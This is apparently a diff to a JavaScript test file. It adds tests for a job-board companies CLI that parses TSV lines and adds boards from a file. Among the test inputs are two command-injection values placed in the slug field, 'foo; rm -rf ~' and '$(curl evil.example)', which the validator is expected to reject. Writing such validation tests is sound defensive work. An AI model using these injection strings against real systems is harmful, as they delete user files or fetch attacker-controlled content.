@@ -5,7 +5,12 @@ const os = require("os");
 const path = require("path");
 
 const companiesTsv = require("../core/companies.js");
-const { makeCompaniesCommand, nameFromSlug, withFileLock } = require("./companies.js");
+const {
+  makeCompaniesCommand,
+  nameFromSlug,
+  withFileLock,
+  parseBoardLines,
+} = require("./companies.js");
 
 // Board API fake: url → JSON body (200) or a number (that HTTP status).
 function fakeFetch(routes) {
@@ -217,4 +222,68 @@ test("withFileLock: serializes writers and breaks a stale lock", async () => {
   fs.utimesSync(lock, old, old);
   assert.equal(await withFileLock(lock, async () => "ran"), "ran");
   assert.ok(!fs.existsSync(lock));
+});
+
+test("parseBoardLines: every line validated; bad lines reported, duplicates dropped", () => {
+  const { entries, invalid } = parseBoardLines(
+    [
+      "# found by the night",
+      "greenhouse\tacmesynthetic\tAcme Synthetic",
+      "lever\tglobex",
+      "LEVER\tGlobex\tGlobex again",
+      "ashby\tfoo; rm -rf ~\tEvil",
+      "ashby\t$(curl evil.example)\tEvil",
+      "workday\tinitech\tInitech",
+      "",
+      "ashby\tumbrella\tUmbrella\u0007 Corp\tExtra",
+    ].join("\n")
+  );
+  assert.deepEqual(
+    entries.map((e) => [e.ats, e.slug, e.name]),
+    [
+      ["greenhouse", "acmesynthetic", "Acme Synthetic"],
+      ["lever", "globex", ""],
+      ["ashby", "umbrella", "Umbrella Corp Extra"],
+    ]
+  );
+  assert.deepEqual(
+    invalid.map((x) => x.line),
+    [5, 6, 7]
+  );
+});
+
+test("companies add --from-file: adds the valid boards, reports the rest, one JSON line each", async () => {
+  const env = setup();
+  const file = path.join(env.dataDir, "topup.tsv");
+  fs.writeFileSync(
+    file,
+    ["greenhouse\tacmesynthetic\tAcme Synthetic", "lever\tbad slug!\tX", "ashby\tnoboard\tNo"].join(
+      "\n"
+    )
+  );
+  const fetchFn = fakeFetch({
+    [GH("acmesynthetic")]: { jobs: [{ id: 1, title: "PM", absolute_url: "https://x/1" }] },
+  });
+  const r = await run({ fetchFn }, { dataDir: env.dataDir, flags: { fromFile: file } });
+  assert.equal(r.code, 0);
+  const lines = r.out.map((l) => JSON.parse(l));
+  assert.deepEqual(
+    lines.map((l) => l.result),
+    ["invalid", "added", "invalid"]
+  );
+  assert.equal(lines[0].line, 2);
+  assert.match(r.err.join("\n"), /1 added, 0 already known, 2 invalid/);
+  const rows = companiesTsv.load(env.file).rows;
+  assert.deepEqual(
+    rows.map((x) => [x.source, x.slug, x.name]),
+    [["greenhouse", "acmesynthetic", "Acme Synthetic"]]
+  );
+  assert.ok(!fetchFn.calls.some((u) => u.includes("bad")), "an invalid slug is never fetched");
+});
+
+test("companies add --from-file: an unreadable file is an error", async () => {
+  const env = setup();
+  const r = await run({}, { dataDir: env.dataDir, flags: { fromFile: "/nonexistent/x.tsv" } });
+  assert.equal(r.code, 1);
+  assert.match(r.err.join("\n"), /cannot read --from-file/);
 });
